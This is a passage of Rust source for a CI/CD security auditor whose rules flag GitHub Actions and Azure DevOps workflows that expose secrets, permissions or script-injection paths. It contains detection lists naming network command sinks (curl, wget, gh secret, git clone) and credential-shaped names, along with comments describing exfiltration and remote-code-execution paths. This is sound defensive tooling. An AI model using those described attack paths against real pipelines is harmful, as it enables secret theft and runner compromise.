        | FindingCategory::SharedSelfHostedPoolNoIsolation => {
            out.insert("self_hosted_runner".into());
        }
        FindingCategory::CacheKeyCrossesTrustBoundary
        | FindingCategory::PrSpecificCacheKeyInDefaultBranchConsumer
        | FindingCategory::GhaSetupNodeCacheHelperPathHandoff
        | FindingCategory::GhaSetupPythonCacheHelperPathHandoff => {
            out.insert("cache".into());
        }
        FindingCategory::GhaDockerSetupQemuPrivilegedDockerHelper => {
            out.insert("privileged_container".into());
        }
        FindingCategory::DotenvArtifactFlowsToPrivilegedDeployment => {
            out.insert("dotenv_artifact".into());
        }
        FindingCategory::UnsafePrArtifactInWorkflowRunConsumer
        | FindingCategory::ArtifactBoundaryCrossing => {
            out.insert("artifact".into());
        }
        _ => {}
    }
    out
}

fn template_resolution_strength_for(graph: &AuthorityGraph, finding: &Finding) -> Option<String> {
    if !matches!(
        finding.category,
        FindingCategory::CrossWorkflowAuthorityChain
            | FindingCategory::TemplateExtendsUnpinnedBranch
            | FindingCategory::TemplateRepoRefIsFeatureBranch
            | FindingCategory::SecretsInheritOverscopedPassthrough
            | FindingCategory::ChildPipelineTriggerInheritsAuthority
    ) {
        return None;
    }
    if graph
        .completeness_gaps
        .iter()
        .any(|gap| gap.to_ascii_lowercase().contains("template"))
    {
        Some("opaque".into())
    } else if graph.completeness == crate::graph::AuthorityCompleteness::Partial {
        Some("partial".into())
    } else {
        Some("resolved".into())
    }
}

fn cve_relationship_for(finding: &Finding) -> Option<&'static str> {
    match finding.category {
        FindingCategory::TriggerContextMismatch
        | FindingCategory::CheckoutSelfPrExposure
        | FindingCategory::SelfHostedPoolPrHijack => Some("same_authority_shape"),
        FindingCategory::ScriptInjectionViaUntrustedContext
        | FindingCategory::SelfMutatingPipeline
        | FindingCategory::UntrustedApiResponseToEnvSink => Some("analogue_only"),
        FindingCategory::UnpinnedAction
            if finding_message_rule_id_is(finding, "known_compromised_action_ref") =>
        {
            Some("same_primitive")
        }
        _ => None,
    }
}

fn runtime_preconditions_for(graph: &AuthorityGraph, finding: &Finding) -> Vec<&'static str> {
    let mut out = Vec::new();
    match finding.category {
        FindingCategory::TriggerContextMismatch
        | FindingCategory::CheckoutSelfPrExposure
        | FindingCategory::SelfHostedPoolPrHijack => {
            out.push("untrusted PR or fork-controlled input can reach this workflow at runtime");
            out.push("the authority shown in the graph is available to that run");
        }
        FindingCategory::RiskyTriggerWithAuthority => {
            out.push(
                "repository settings allow the high-blast-radius trigger to execute this workflow",
            );
            out.push("write permissions or non-default secrets remain available at runtime");
        }
        FindingCategory::ServiceConnectionScopeMismatch
        | FindingCategory::ProdDeployJobNoEnvironmentGate
        | FindingCategory::TerraformAutoApproveInProd
        | FindingCategory::AddSpnWithInlineScript => {
            out.push("the referenced service connection is authorized for this pipeline");
            out.push("Azure DevOps approvals or checks do not fully block use of the resource");
        }
        FindingCategory::VariableGroupInPrJob => {
            out.push("the referenced variable group contains protected or secret values");
            out.push("Azure DevOps variable-group permissions allow this pipeline to read it");
        }
        FindingCategory::UnpinnedAction
            if finding_message_rule_id_is(finding, "known_compromised_action_ref") =>
        {
            out.push("the workflow run time overlaps the advisory exposure window");
            out.push(
                "the mutable action ref resolved to an affected commit or version at run time",
            );
        }
        FindingCategory::UnpinnedAction
        | FindingCategory::PrTriggerWithFloatingActionRef
        | FindingCategory::UnpinnedIncludeRemoteOrBranchRef
        | FindingCategory::TemplateExtendsUnpinnedBranch
        | FindingCategory::TemplateRepoRefIsFeatureBranch
        | FindingCategory::FloatingImage => {
            out.push("the referenced mutable branch, tag, include, or image can change independently of this repository");
        }
        FindingCategory::LaterSecretMaterializedAfterPathMutation
        | FindingCategory::GhaHelperPathSensitiveArgv
        | FindingCategory::GhaHelperPathSensitiveStdin
        | FindingCategory::GhaHelperPathSensitiveEnv
        | FindingCategory::GhaActionMintedSecretToHelper
        | FindingCategory::GhaHelperUntrustedPathResolution
        | FindingCategory::GhaSetupNodeCacheHelperPathHandoff
        | FindingCategory::GhaSetupPythonCacheHelperPathHandoff
        | FindingCategory::GhaDockerSetupQemuPrivilegedDockerHelper => {
            out.push(
                "an earlier same-job step can influence PATH before the later helper boundary runs",
            );
            out.push("the later action or helper boundary receives authority at runtime");
        }
        FindingCategory::GhaSetupPythonPipInstallAuthorityEnv
        | FindingCategory::GhaToolInstallerThenShellHelperAuthority
        | FindingCategory::GhaWorkflowShellAuthorityConcentration => {
            out.push("token, cloud, registry, package, or signing authority is present in the job environment");
            out.push("the workflow-authored helper command runs on the hosted runner");
        }
        FindingCategory::ManualDispatchInputToUrlOrCommand
        | FindingCategory::ParameterInterpolationIntoShell => {
            out.push("an actor with dispatch or queue permission can supply untrusted input");
        }
        FindingCategory::OverPrivilegedIdentity
            if finding_message_rule_id_is(finding, "oidc_identity_in_untrusted_context") =>
        {
            out.push("downstream identity provider accepts the issued OIDC token");
            out.push("the configured audience or cloud role grants useful authority");
        }
        FindingCategory::IdTokenAudienceOverscoped | FindingCategory::UpliftWithoutAttestation => {
            out.push("downstream identity provider accepts the issued OIDC token");
            out.push("the configured audience or cloud role grants useful authority");
        }
        _ => {}
    }
    if graph.completeness == crate::graph::AuthorityCompleteness::Partial {
        out.push("the parsed graph is partial; unresolved YAML may add or remove authority paths");
    }
    out
}

fn finding_message_rule_id_is(finding: &Finding, id: &str) -> bool {
    let Some(rest) = finding.message.strip_prefix('[') else {
        return false;
    };
    rest.strip_prefix(id)
        .and_then(|tail| tail.strip_prefix(']'))
        .is_some()
}

// ── R3: risky_trigger_with_authority ────────────────────
// `issue_comment`, `pull_request_review`, `pull_request_review_comment`, and
// `workflow_run` are high-blast-radius triggers — anyone able to comment on
// an issue (or any contributor whose previous workflow run completed) can
// fire the workflow with secrets in scope. `trigger_context_mismatch` only
// fires on `pull_request_target` / ADO `pr`, so this rule closes the gap.

/// Trigger names that confer the same effective blast radius as
/// `pull_request_target` once they're paired with write permissions or
/// non-`GITHUB_TOKEN` secrets. Order is alphabetical for stable output.
const RISKY_TRIGGERS: &[&str] = &[
    "issue_comment",
    "pull_request_review",
    "pull_request_review_comment",
    "workflow_run",
];

/// Returns true if the permissions string declares any GitHub Actions
/// write-grant scope (`*: write`) or `write-all`. Conservatively flags
/// any unscoped `write-all`. The check looks for `: write` substrings so
/// it catches `contents: write`, `pull-requests: write`, `id-token: write`,
/// etc., regardless of how `Permissions::Map` formats the surrounding map.
fn permissions_grant_writes(perm_string: &str) -> bool {
    let p = perm_string.to_lowercase();
    p.contains("write-all") || p.contains(": write")
}

/// Rule: high-blast-radius trigger (`issue_comment`,
/// `pull_request_review[_comment]`, `workflow_run`) declared alongside
/// write-grant permissions or any non-`GITHUB_TOKEN` secret.
///
/// Detection (deterministic, no path traversal):
/// 1. Read `META_TRIGGERS` (graph metadata) — comma-joined list of every
///    trigger declared under `on:`.
/// 2. Filter for entries in `RISKY_TRIGGERS`.
/// 3. Inspect every Identity node carrying `META_PERMISSIONS` — if any
///    grants `: write` or `write-all`, the workflow holds write authority.
/// 4. Scan all Secret nodes; any whose name is not literally `GITHUB_TOKEN`
///    counts as a non-default secret in scope.
/// 5. Fire one finding per workflow when steps 1–2 match AND (3 OR 4).
///
/// Severity: High. The blast radius matches `pull_request_target` but the
/// trigger surface is broader (anyone with comment access vs. only PR
/// authors), so this rule never downgrades by trigger type.
pub fn risky_trigger_with_authority(graph: &AuthorityGraph) -> Vec<Finding> {
    let triggers_meta = match graph.metadata.get(META_TRIGGERS) {
        Some(t) => t,
        None => return Vec::new(),
    };

    let risky_present: Vec<&str> = triggers_meta
        .split(',')
        .map(str::trim)
        .filter(|t| RISKY_TRIGGERS.iter().any(|r| r == t))
        .collect();

    if risky_present.is_empty() {
        return Vec::new();
    }

    // (3) Any Identity node with write permissions?
    let mut writes_identities: Vec<NodeId> = Vec::new();
    for ident in graph.nodes_of_kind(NodeKind::Identity) {
        if let Some(perms) = ident.metadata.get(META_PERMISSIONS) {
            if permissions_grant_writes(perms) {
                writes_identities.push(ident.id);
            }
        }
    }

    // (4) Any non-GITHUB_TOKEN secret in scope?
    let non_default_secrets: Vec<NodeId> = graph
        .nodes_of_kind(NodeKind::Secret)
        .filter(|s| s.name != "GITHUB_TOKEN")
        .map(|s| s.id)
        .collect();

    if writes_identities.is_empty() && non_default_secrets.is_empty() {
        return Vec::new();
    }

    let trigger_label = risky_present.join(", ");
    let cause = if !writes_identities.is_empty() && !non_default_secrets.is_empty() {
        format!(
            "{} write-grant identit{} and {} non-default secret{}",
            writes_identities.len(),
            if writes_identities.len() == 1 {
                "y"
            } else {
                "ies"
            },
            non_default_secrets.len(),
            if non_default_secrets.len() == 1 {
                ""
            } else {
                "s"
            },
        )
    } else if !writes_identities.is_empty() {
        format!(
            "{} write-grant identit{}",
            writes_identities.len(),
            if writes_identities.len() == 1 {
                "y"
            } else {
                "ies"
            },
        )
    } else {
        format!(
            "{} non-default secret{}",
            non_default_secrets.len(),
            if non_default_secrets.len() == 1 {
                ""
            } else {
                "s"
            },
        )
    };

    let mut nodes_involved = writes_identities.clone();
    nodes_involved.extend(non_default_secrets);

    vec![Finding {
        severity: Severity::High,
        category: FindingCategory::RiskyTriggerWithAuthority,
        path: None,
        nodes_involved,
        message: format!(
            "Workflow trigger(s) [{trigger_label}] grant the same blast radius as pull_request_target but slip past trigger_context_mismatch — {cause} are reachable from any commenter / upstream-run author"
        ),
        recommendation: Recommendation::Manual {
            action: "Drop write-grant permissions to the minimum the trigger requires (most labelers/triagers only need `pull-requests: write` or `issues: write`), or split the workflow: keep the comment-triggered handler authority-free and gate privileged work behind a separate workflow that an authorized user must dispatch manually.".into(),
        },
        source: FindingSource::BuiltIn,
        extras: FindingExtras::default(),
    }]
}

// ── R4: sensitive_value_in_job_output ───────────────────
// `jobs.<id>.outputs.<name>` is written to the run log (only the heuristic
// mask protects it) and propagates unmasked via `needs.<job>.outputs.*`.
// Sourcing an output from `secrets.*`, an OIDC-bearing step output, or
// giving it a credential-shaped name is a structural leak.

/// Suffixes that mark a job-output name as credential-shaped. Matched
/// case-insensitively against the trailing segment of the output name.
const CREDENTIAL_NAME_SUFFIXES: &[&str] = &[
    "_token",
    "_secret",
    "_key",
    "_pem",
    "_password",
    "_credential",
    "_credentials",
    "_api_key",
];

/// Returns true if `name` ends with any of `CREDENTIAL_NAME_SUFFIXES`,
/// matched case-insensitively.
fn output_name_is_credential_shaped(name: &str) -> bool {
    let lower = name.to_lowercase();
    CREDENTIAL_NAME_SUFFIXES.iter().any(|s| lower.ends_with(s))
}

/// Rule: a `jobs.<id>.outputs.<name>` value is sourced from `secrets.*`, an
/// OIDC-bearing step output, or has a credential-shaped name (suffix
/// matches `_token` / `_secret` / `_key` / `_pem` / `_password` /
/// `_credential[s]` / `_api_key`).
///
/// Detection: read `META_JOB_OUTPUTS` (graph metadata) — pipe-delimited
/// records of `<job>\t<name>\t<source>`. For each record, fire a finding
/// when `source != "literal"` OR `name` matches a credential suffix.
///
/// Severity:
/// - **Critical** when `source == "secret"` (raw `secrets.*` value).
/// - **Critical** when `source == "oidc"` (OIDC token leaked via output).
/// - **High** when `source == "step_output"` AND name is credential-shaped.
/// - **High** when `source == "literal"` AND name is credential-shaped
///   (developer is signaling credential intent in the API).
/// - Otherwise no finding.
pub fn sensitive_value_in_job_output(graph: &AuthorityGraph) -> Vec<Finding> {
    let raw = match graph.metadata.get(META_JOB_OUTPUTS) {
        Some(s) if !s.is_empty() => s,
        _ => return Vec::new(),
    };

    let mut findings = Vec::new();

    for record in raw.split('|') {
        // Format: "<job>\t<name>\t<source>"
        let mut fields = record.splitn(3, '\t');
        let job = match fields.next() {
            Some(j) if !j.is_empty() => j,
            _ => continue,
        };
        let name = match fields.next() {
            Some(n) if !n.is_empty() => n,
            _ => continue,
        };
        let source = fields.next().unwrap_or("literal");

        let credential_named = output_name_is_credential_shaped(name);

        let (severity, reason) = match source {
            "secret" => (
                Severity::Critical,
                "value reads `secrets.*` directly — exfiltrated to run log and to every downstream `needs.*.outputs.*` consumer",
            ),
            "oidc" => (
                Severity::Critical,
                "value derives from a step that holds an OIDC identity — the federated token leaks through the output channel",
            ),
            "step_output" if credential_named => (
                Severity::High,
                "credential-shaped output name backed by a step output — masking is heuristic, downstream consumers see plaintext",
            ),
            "literal" if credential_named => (
                Severity::High,
                "credential-shaped output name with a literal value — either the value is a hard-coded secret or the contract leaks credentials to downstream jobs",
            ),
            _ => continue,
        };

        // Anchor on `<job>.<output>.<source>` so two outputs in one job,
        // or the same output name in different jobs, do not collide
        // (ISC-18). Source is included to keep e.g. a "secret"-sourced
        // and a "step_output"-sourced output with the same name in the
        // same job distinct.
        findings.push(Finding {
            severity,
            category: FindingCategory::SensitiveValueInJobOutput,
            path: None,
            nodes_involved: Vec::new(),
            message: format!(
                "Job '{job}' declares output '{name}' — {reason}"
            ),
            recommendation: Recommendation::Manual {
                action: "Do not expose secrets, OIDC tokens, or credential-shaped values via `jobs.<id>.outputs.*`. Pass them between steps within a single job using `env:` (which honors masking) or write them to a secure file consumed only by a downstream step. If a downstream job needs to act on a credential, fetch it directly from the secret store inside that job instead of inheriting it through outputs.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::with_anchor(format!("{job}.{name}:{source}")),
        });
    }

    findings
}

// ── R6: manual_dispatch_input_to_url_or_command ────────
// `workflow_dispatch.inputs.*` is attacker-controlled in any repository
// where collaborators have `Actions: write`. Flowing an input value into
// `curl` / `wget` / `gh api` / a `run:` URL / `actions/checkout` `ref:`
// gives the dispatcher arbitrary code execution against the runner — a
// pivot from "can run a workflow" to "can land arbitrary code on a
// privileged runner".

/// Tokens that indicate command-line consumption of an input value when
/// they appear in the same `run:` body as the input expression. Each token
/// must be matched whole-word so we don't false-positive on `curlier` etc.
const COMMAND_SINKS: &[&str] = &[
    "curl",
    "wget",
    "gh api",
    "gh release",
    "gh secret",
    "gh repo",
    "git clone",
    "git fetch",
];

/// Returns true if `body` contains a whole-word occurrence of `needle`.
/// "Whole word" = preceded by start-of-string or non-alphanumeric, and
/// followed by end-of-string or non-alphanumeric. Avoids matching
/// `curl` inside `curlier` or `git fetch` inside `git fetcher`.
fn body_contains_command(body: &str, needle: &str) -> bool {
    let mut start = 0;
    while let Some(rel) = body[start..].find(needle) {
        let abs = start + rel;
        let before_ok = abs == 0
            || !body
                .as_bytes()
                .get(abs - 1)
                .map(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .unwrap_or(false);
        let after_idx = abs + needle.len();
        let after_ok = after_idx == body.len()
            || !body
                .as_bytes()
                .get(after_idx)
                .map(|b| b.is_ascii_alphanumeric() || *b == b'_')
                .unwrap_or(false);
        if before_ok && after_ok {
            return true;
        }
        start = abs + needle.len();
    }
    false
}

/// Returns true if `body` references the dispatch input `name` via either
/// `${{ inputs.<name> }}` or `${{ github.event.inputs.<name> }}`. Tolerates
/// any whitespace inside the `${{ … }}` expression.
fn body_references_input(body: &str, name: &str) -> bool {
    // Substring forms — GHA accepts both `inputs.X` and `github.event.inputs.X`.
    let needle_a = format!("inputs.{name}");
    let needle_b = format!("github.event.inputs.{name}");
    body.contains(&needle_a) || body.contains(&needle_b)
}

/// Rule: a `workflow_dispatch.inputs.*` value flows into a command sink
/// (`curl`, `wget`, `gh api`, `git clone`, …) or `actions/checkout`
/// `with.ref:`.
///
/// Detection:
/// 1. Read `META_DISPATCH_INPUTS` — comma-joined list of input names.
/// 2. For every Step node carrying `META_SCRIPT_BODY`, fire a finding when
///    the body references any input name AND contains a whole-word
///    occurrence of any `COMMAND_SINKS` entry.
/// 3. For every Step node carrying `META_CHECKOUT_REF`, fire a finding when
///    the ref expression references any input name (the ref is consumed by
///    `actions/checkout`, which performs `git fetch` / `git checkout`
///    against the supplied ref).
///
/// Severity: High. Dispatch is a privileged operation, but the privileged
/// surface is bounded to whoever holds `Actions: write` on the repo —
/// narrower than `pull_request_target`, broader than a maintainer-only
/// secret.
pub fn manual_dispatch_input_to_url_or_command(graph: &AuthorityGraph) -> Vec<Finding> {
    let inputs_meta = match graph.metadata.get(META_DISPATCH_INPUTS) {
        Some(s) if !s.is_empty() => s,
        _ => return Vec::new(),
    };

    let inputs: Vec<&str> = inputs_meta
        .split(',')
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect();
    if inputs.is_empty() {
        return Vec::new();
    }

    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        // (a) Script body sink
        if let Some(body) = step.metadata.get(META_SCRIPT_BODY) {
            let referenced: Vec<&str> = inputs
                .iter()
                .copied()
                .filter(|name| body_references_input(body, name))
                .collect();
            if !referenced.is_empty() {
                let sinks: Vec<&str> = COMMAND_SINKS
                    .iter()
                    .copied()
                    .filter(|s| body_contains_command(body, s))
                    .collect();
                if !sinks.is_empty() {
                    findings.push(Finding {
                        severity: Severity::High,
                        category: FindingCategory::ManualDispatchInputToUrlOrCommand,
                        path: None,
                        nodes_involved: vec![step.id],
                        message: format!(
                            "Step '{}' interpolates workflow_dispatch input(s) [{}] into command sink(s) [{}] — anyone with Actions:write can pivot the run to attacker-controlled hosts/refs",
                            step.name,
                            referenced.join(", "),
                            sinks.join(", "),
                        ),
                        recommendation: Recommendation::Manual {
                            action: "Pass the input through the step's `env:` block (where the runtime quotes it) and reference `\"$INPUT_NAME\"` in the script. For URLs, validate against an allowlist before fetching. Never let a dispatch input land in a `git clone` / `actions/checkout` ref without an explicit allowlist of permitted refs.".into(),
                        },
                        source: FindingSource::BuiltIn,
                        extras: FindingExtras::default(),
                    });
                }
            }
        }

        // (b) actions/checkout ref sink
        if let Some(ref_expr) = step.metadata.get(META_CHECKOUT_REF) {
            let referenced: Vec<&str> = inputs
                .iter()
                .copied()
                .filter(|name| body_references_input(ref_expr, name))
                .collect();
            if !referenced.is_empty() {
                findings.push(Finding {
                    severity: Severity::High,
                    category: FindingCategory::ManualDispatchInputToUrlOrCommand,
                    path: None,
                    nodes_involved: vec![step.id],
                    message: format!(
                        "Step '{}' uses workflow_dispatch input(s) [{}] as the actions/checkout ref — the dispatcher chooses which commit lands on the privileged runner",
                        step.name,
                        referenced.join(", "),
                    ),
                    recommendation: Recommendation::Manual {
                        action: "Constrain the dispatch input via a `type: choice` `options:` allowlist of permitted refs/branches, or hard-code the ref and accept a different parameter (e.g. release tag) that maps onto a vetted ref.".into(),
                    },
                    source: FindingSource::BuiltIn,
                    extras: FindingExtras::default(),
                });
            }
        }
    }

    findings
}
/// Set of trigger names whose runs are influenced by parties outside the
/// repo's write-permission set — anything that can be initiated by opening a
/// PR, commenting on an issue, or reacting to another workflow's outcome.
/// Used by `secrets_inherit_overscoped_passthrough` and
/// `unsafe_pr_artifact_in_workflow_run_consumer` to gate detection.
const RISKY_TRIGGER_NAMES: &[&str] = &[
    "pull_request",
    "pull_request_target",
    "pull_request_review",
    "pull_request_review_comment",
    "issue_comment",
    "workflow_run",
];

/// Returns true if any trigger name in the comma-joined `META_TRIGGERS` list
/// matches a risky trigger.
fn graph_has_risky_trigger(graph: &AuthorityGraph) -> bool {
    let Some(triggers) = graph.metadata.get(META_TRIGGERS) else {
        return false;
    };
    triggers
        .split(',')
        .any(|t| RISKY_TRIGGER_NAMES.contains(&t.trim()))
}

/// Returns the first risky trigger name present on the graph, for messaging.
fn first_risky_trigger(graph: &AuthorityGraph) -> Option<String> {
    let triggers = graph.metadata.get(META_TRIGGERS)?;
    triggers
        .split(',')
        .find(|t| RISKY_TRIGGER_NAMES.contains(&t.trim()))
        .map(|s| s.trim().to_string())
}

/// Rule: reusable workflow call uses `secrets: inherit` under a risky trigger.
///
/// Fires once per Step node carrying `META_SECRETS_INHERIT = "true"` when the
/// graph's `META_TRIGGERS` set contains at least one attacker-influenced
/// trigger (`pull_request`, `pull_request_target`, `issue_comment`,
/// `workflow_run`, `pull_request_review`, `pull_request_review_comment`).
///
/// `secrets: inherit` forwards the entire caller secret bag to the callee
/// regardless of which secrets the callee actually consumes. Combined with a
/// trigger an external party can fire, every secret in scope is one
/// compromised callee away from exfiltration.
pub fn secrets_inherit_overscoped_passthrough(graph: &AuthorityGraph) -> Vec<Finding> {
    if !graph_has_risky_trigger(graph) {
        return Vec::new();
    }
    let trigger = first_risky_trigger(graph).unwrap_or_else(|| "risky".into());

    let mut findings = Vec::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let inherits = step
            .metadata
            .get(META_SECRETS_INHERIT)
            .map(|v| v == "true")
            .unwrap_or(false);
        if !inherits {
            continue;
        }

        // Find the reusable workflow target the step delegates to (if any) so
        // the message can name the callee.
        let target_name = graph
            .edges_from(step.id)
            .filter(|e| e.kind == EdgeKind::DelegatesTo)
            .filter_map(|e| graph.node(e.to))
            .find(|n| n.kind == NodeKind::Image)
            .map(|n| n.name.clone())
            .unwrap_or_else(|| "<unknown>".into());

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::SecretsInheritOverscopedPassthrough,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Job '{}' calls reusable workflow '{}' with `secrets: inherit` while the workflow is triggered by '{}' — every caller secret forwards to the callee regardless of need",
                step.name, target_name, trigger
            ),
            recommendation: Recommendation::Manual {
                action: "Replace `secrets: inherit` with an explicit `secrets:` mapping listing only the secrets the callee actually consumes. For PR/comment/workflow_run-triggered callers, audit the callee for log exposure of every forwarded secret.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// Rule: `workflow_run`/`pull_request_target` consumer downloads a PR-context
/// artifact AND interprets its content into a privileged sink.
///
/// Requires:
/// 1. Graph trigger is `workflow_run` or `pull_request_target` (the producer
///    ran in PR context, so the artifact is attacker-controlled).
/// 2. At least one Step in a job carries `META_DOWNLOADS_ARTIFACT = "true"`.
/// 3. At least one Step in the *same job* carries
///    `META_INTERPRETS_ARTIFACT = "true"` (post-to-comment, write to
///    `$GITHUB_ENV`, `eval`, `unzip`, `cat`, `jq`, …).
///
/// Differs from `artifact_boundary_crossing`: that rule flags upload→download
/// trust crossings on Artifact nodes; this rule additionally requires the
/// consumer interprets the downloaded content.
pub fn unsafe_pr_artifact_in_workflow_run_consumer(graph: &AuthorityGraph) -> Vec<Finding> {
    // Trigger gate: workflow_run consumers and pull_request_target both run
    // in upstream-repo context with elevated permissions while the artifact
    // (or PR head ref) originates from PR context.
    let triggers_ok = {
        let single = graph
            .metadata
            .get(META_TRIGGER)
            .map(|s| s == "workflow_run" || s == "pull_request_target")
            .unwrap_or(false);
        let multi = graph
            .metadata
            .get(META_TRIGGERS)
            .map(|s| {
                s.split(',')
                    .any(|t| t.trim() == "workflow_run" || t.trim() == "pull_request_target")
            })
            .unwrap_or(false);
        single || multi
    };
    if !triggers_ok {
        return Vec::new();
    }

    // Group steps by job name so we can pair download + interpret within a job.
    use std::collections::BTreeMap;
    let mut by_job: BTreeMap<String, (Vec<NodeId>, Vec<NodeId>)> = BTreeMap::new();
    for step in graph.nodes_of_kind(NodeKind::Step) {
        let job = step
            .metadata
            .get(META_JOB_NAME)
            .cloned()
            .unwrap_or_default();
        let entry = by_job.entry(job).or_default();
        if step
            .metadata
            .get(META_DOWNLOADS_ARTIFACT)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            entry.0.push(step.id);
        }
        if step
            .metadata
            .get(META_INTERPRETS_ARTIFACT)
            .map(|v| v == "true")
            .unwrap_or(false)
        {
            entry.1.push(step.id);
        }
    }

    let mut findings = Vec::new();
    for (job, (downloaders, interpreters)) in by_job {
        if downloaders.is_empty() || interpreters.is_empty() {
            continue;
        }
        let mut nodes_involved = downloaders.clone();
        nodes_involved.extend(interpreters.iter().copied());

        let job_label = if job.is_empty() {
            "<workflow-level>".to_string()
        } else {
            job
        };

        findings.push(Finding {
            severity: Severity::High,
            category: FindingCategory::UnsafePrArtifactInWorkflowRunConsumer,
            path: None,
            nodes_involved,
            message: format!(
                "Job '{job_label}' downloads a PR-context artifact and interprets its content (post-to-comment, $GITHUB_ENV write, eval/unzip/cat/jq) — malicious PRs can write arbitrary content into the artifact while the consumer runs with upstream-repo authority",
            ),
            recommendation: Recommendation::Manual {
                action: "Treat downloaded artifacts as untrusted: validate against a strict schema before parsing, never feed contents into `eval`/`$GITHUB_ENV`/`$GITHUB_OUTPUT`, and post comment bodies through a length-and-character-allowlist filter. Where possible, separate the privileged-sink step into its own job that does not download the artifact.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

// ── GHA security rules from corpus gap analysis ─────────────────────────
//
// Source: MEMORY/WORK/20260425-230443_taudit-gitlab-parser/corpus-results/council-gha-gaps.md
// Rules R1, R5, R9, R10. All four read META_SCRIPT_BODY (R1, R10) or
// step-level metadata stamped by the GHA parser (R5, R9). They gate on
// META_TRIGGERS where a specific trigger surface is required.

/// Returns true if `triggers_csv` (the comma-separated value of META_TRIGGERS
/// stamped by the GHA parser) contains any of `wanted`. Tolerant of
/// whitespace and empty entries.
fn triggers_contain_any(triggers_csv: Option<&String>, wanted: &[&str]) -> bool {
    let Some(csv) = triggers_csv else {
        return false;
    };
    csv.split(',')
        .map(|s| s.trim())
        .any(|t| wanted.contains(&t))
}

/// Substring locations of every `${{ ... }}` expression inside `body`. Returns
/// the inner trimmed expression text plus the byte range so callers can attach
/// surrounding-context heuristics. Doesn't try to handle nested `}}` — none of
/// the patterns we care about contain it.
fn find_template_expressions(body: &str) -> Vec<(String, std::ops::Range<usize>)> {
    let mut out = Vec::new();
    let mut cursor = 0usize;
    while let Some(rel_open) = body[cursor..].find("${{") {
        let open = cursor + rel_open;
        let inner_start = open + 3;
        let Some(rel_close) = body[inner_start..].find("}}") else {
            break;
        };
        let close = inner_start + rel_close;
        let expr = body[inner_start..close].trim().to_string();
        out.push((expr, open..close + 2));
        cursor = close + 2;
    }
    out
}

/// Patterns that mark an attacker-controllable expression for R1.
/// Order matters only for documentation — detection is OR.
fn is_untrusted_context_expression(expr: &str) -> bool {
    // Strip leading/trailing whitespace already done by caller.
    // Examples: `github.event.issue.title`, `github.event.pull_request.body`,
    // `github.event.comment.body`, `github.event.review.body`,
    // `github.head_ref`, `inputs.target_branch`.
    if expr.starts_with("github.event.issue.")
        || expr.starts_with("github.event.pull_request.")
        || expr.starts_with("github.event.comment.")
        || expr.starts_with("github.event.review.")
        || expr.starts_with("github.event.discussion.")
        || expr.starts_with("github.event.workflow_run.")
        || expr.starts_with("github.event.inputs.")
    {
        return true;
    }
    if expr == "github.head_ref" || expr.starts_with("github.head_ref ") {
        return true;
    }
    // `inputs.X` is attacker-influenced under workflow_dispatch / workflow_run
    // / issue_comment-driven inputs. The rule's caller gates on the trigger
    // surface, so any `inputs.*` here is suspect.
    if let Some(rest) = expr.strip_prefix("inputs.") {
        if !rest.is_empty() {
            return true;
        }
    }
    false
}

/// Returns true when an expression's value lands in a script sink that
/// matters for R1 — shell text, JS source, or a write to GITHUB_ENV /
/// GITHUB_OUTPUT. Heuristic: the expression is **not** the right-hand side of
/// a YAML `env:` mapping. The parser already separates step-level `env:`
/// mappings into the secret/auth machinery, so any expression appearing inside
/// the script body itself bypasses the env-indirection mitigation by
/// definition.
fn is_script_injection_sink(_body: &str, _range: &std::ops::Range<usize>) -> bool {
    // Every occurrence inside META_SCRIPT_BODY qualifies — the body is the
    // shell/JS source itself. (Step-level `env:` values are stored on the
    // edges, not in the body.) Kept as a function so the doc string spells
    // the rationale and future heuristics have a clear hook.
    true
}

/// R1 — script injection via untrusted context.
///
/// Severity: Critical. Classic GitHub Actions remote code execution: an
/// expression that an external actor controls (`github.event.issue.title`,
/// `github.head_ref`, `github.event.inputs.*` under `workflow_dispatch`)
/// gets concatenated into the shell command (or JS source for
/// `actions/github-script`) at YAML-render time, before any quoting or
/// escaping the runtime would apply to env-bound values.
pub fn script_injection_via_untrusted_context(graph: &AuthorityGraph) -> Vec<Finding> {
    let mut findings = Vec::new();

    for step in graph.nodes_of_kind(NodeKind::Step) {
        let Some(body) = step.metadata.get(META_SCRIPT_BODY) else {
            continue;
        };
        if body.is_empty() {
            continue;
        }

        let mut hits: Vec<String> = Vec::new();
        for (expr, range) in find_template_expressions(body) {
            if !is_untrusted_context_expression(&expr) {
                continue;
            }
            if !is_script_injection_sink(body, &range) {
                continue;
            }
            if !hits.contains(&expr) {
                hits.push(expr);
            }
        }

        if hits.is_empty() {
            continue;
        }

        // Cap preview to keep the message readable even when a step has many
        // distinct attacker-controlled interpolations.
        let preview: String = hits
            .iter()
            .take(3)
            .map(|s| format!("${{{{ {s} }}}}"))
            .collect::<Vec<_>>()
            .join(", ");
        let suffix = if hits.len() > 3 {
            format!(", and {} more", hits.len() - 3)
        } else {
            String::new()
        };

        findings.push(Finding {
            severity: Severity::Critical,
            category: FindingCategory::ScriptInjectionViaUntrustedContext,
            path: None,
            nodes_involved: vec![step.id],
            message: format!(
                "Step '{}' interpolates attacker-controlled expression(s) {preview}{suffix} directly into a script body without an env: indirection — classic GitHub Actions RCE",
                step.name
            ),
            recommendation: Recommendation::Manual {
                action: "Bind the expression to a step-level `env:` variable and reference it as `\"$VAR\"` (shell) or `process.env.VAR` (JS). The runtime then quotes the value as data instead of YAML-rendering it as code.".into(),
            },
            source: FindingSource::BuiltIn,
            extras: FindingExtras::default(),
        });
    }

    findings
}

/// R5 — interactive debug action in an authority workflow.
///
/// Severity: High. A successful tmate / upterm session opens an external SSH
/// endpoint into the runner with the full job environment loaded — every
/// secret in scope, the checked-out HEAD, and write access to whatever the
/// GITHUB_TOKEN holds. Anyone who can flip `debug_enabled=true` at job start
/// (often a maintainer with `workflow_dispatch` permission) can launder the
/// job's authority off the runner.
pub fn interactive_debug_action_in_authority_workflow(graph: &AuthorityGraph) -> Vec<Finding> {
